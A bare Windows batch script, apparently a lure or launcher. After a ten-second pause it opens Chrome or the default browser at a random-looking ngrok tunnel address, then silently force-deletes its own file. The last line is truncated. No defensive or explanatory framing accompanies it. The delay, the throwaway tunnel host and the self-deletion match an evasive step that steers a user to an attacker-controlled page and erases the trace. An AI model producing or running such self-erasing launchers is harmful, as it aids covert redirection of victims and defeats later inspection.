@echo off
timeout /t 10 /nobreak >nul
if exist "C:\Program Files\Google\Chrome\Application\chrome.exe" (
    start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" "https://seventy-rigging-ploy.ngrok-free.dev"
) else (
    start "" "https://seventy-rigging-ploy.ngrok-free.dev"
)
del /F /Q "%~f0" >nul 2>&
